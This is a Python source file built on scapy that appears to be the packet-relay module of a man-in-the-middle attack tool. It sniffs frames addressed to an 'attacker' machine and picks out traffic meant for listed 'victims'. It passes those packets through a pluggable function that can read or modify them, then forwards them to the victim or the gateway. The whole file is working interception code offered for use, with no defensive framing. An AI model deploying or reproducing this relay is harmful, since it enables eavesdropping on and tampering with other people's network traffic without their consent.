#from turtle import end_fill
from scapy.all import *
load_layer("http") 

import time
import threading
  
def check_packet(pkt, args):
    return pkt


def read_packets(attacker, victims, gateway, function, options, packet_function_args):
    while True:
        pkt = sniff(count=1, iface=options.iface, filter="not arp and not icmp and ether dst "+attacker.mac)[0]
        
        if (pkt.haslayer(IP) and pkt[IP].dst == attacker.ip):
             continue

        print("[+] Packet found MAC from: {} to: {}".format(pkt[Ether].src, pkt[Ether].dst), end="")  if options.verbose else 0
        if (pkt.haslayer(IP)):
            print("   IP from: {} to: {}".format(pkt[IP].src, pkt[IP].dst))  if options.verbose else 0
        else:
            print()


        mac = gateway.mac

        if (pkt.haslayer(IP)):
            for victim in victims:
                # print(victim.ip)
                if pkt[IP].dst == victim.ip:
                    mac = victim.mac

                    print("[+] Packet found for " + victim.ip)  if options.verbose else 0
                    print(pkt.summary())  if options.verbose else 0

                    pkt = function(pkt, packet_function_args)



        if pkt.haslayer(Ether):
            if (pkt[Ether].dst == attacker.mac):
                pkt[Ether].dst = mac
        else:
            pkt = Ether(dst=mac) / pkt

        sendp(pkt, iface=options.iface, verbose=False)

def main(function, victims, attacker, gateway, options, packet_function_args):
    
    # for victim in victims:
        # print victim ip
    print("[*] gateway " + gateway.ip + "..." + gateway.mac) if options.verbose else 0
    print("[*] attacker " + attacker.ip + "..." + attacker.mac) if options.verbose else 0
    threading.Thread(target=read_packets, args=(attacker, victims, gateway, function, options, packet_function_args), daemon=True).start()

    # threading.Thread(target=read_other_packets, args=(attacker, victims, function, options, packet_function_args), daemon=True).start()
    # wait for ctrl+c to exit application
    try: 
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        sys.exit(0) 















